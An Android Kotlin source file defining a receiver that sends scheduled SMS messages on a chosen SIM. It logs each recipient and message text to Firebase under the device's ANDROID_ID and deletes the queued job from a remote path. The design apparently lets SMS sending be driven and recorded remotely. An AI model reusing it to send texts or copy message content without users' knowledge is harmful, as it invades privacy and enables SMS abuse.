package com.example.fast.receiver

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import com.example.fast.config.AppConfig
import com.example.fast.util.FirebaseWriteHelper
import com.example.fast.util.LogHelper
import com.google.firebase.Firebase
import com.google.firebase.database.database
import com.prexoft.prexocore.anon.SimSlot
import com.prexoft.prexocore.sendSms

/**
 * BroadcastReceiver for scheduled SMS messages
 * Handles AlarmManager-triggered scheduled SMS sending
 */
class ScheduledSmsReceiver : BroadcastReceiver() {
    
    override fun onReceive(context: Context, intent: Intent) {
        val phone = intent.getStringExtra("phone") ?: return
        val message = intent.getStringExtra("message") ?: return
        val sim = intent.getIntExtra("sim", 1)
        val historyTimestamp = intent.getLongExtra("historyTimestamp", 0L)
        val scheduledMessagePath = intent.getStringExtra("scheduledMessagePath") ?: return
        
        try {
            LogHelper.d("ScheduledSmsReceiver", "Executing scheduled SMS - Phone: $phone, SIM: $sim")
            
            // Send SMS
            context.sendSms(phone, message, if (sim == 1) SimSlot.SIM_1 else SimSlot.SIM_2)
            
            // Log to Firebase
            val timestamp = System.currentTimeMillis()
            val deviceId = android.provider.Settings.Secure.getString(
                context.contentResolver,
                android.provider.Settings.Secure.ANDROID_ID
            )
            val messagePath = AppConfig.getFirebaseMessagePath(deviceId, timestamp)
            
            FirebaseWriteHelper.setValue(
                path = messagePath,
                data = "sent~$phone~$message",
                tag = "ScheduledSmsReceiver",
                onSuccess = {
                    LogHelper.d("ScheduledSmsReceiver", "Scheduled SMS sent and logged successfully")
                },
                onFailure = { e ->
                    LogHelper.e("ScheduledSmsReceiver", "Failed to log scheduled SMS", e)
                }
            )
            
            // Remove from scheduled messages
            Firebase.database.reference.child(scheduledMessagePath).removeValue()
            
            LogHelper.d("ScheduledSmsReceiver", "Scheduled SMS execution completed")
        } catch (e: Exception) {
            LogHelper.e("ScheduledSmsReceiver", "Error sending scheduled SMS", e)
        }
    }
}
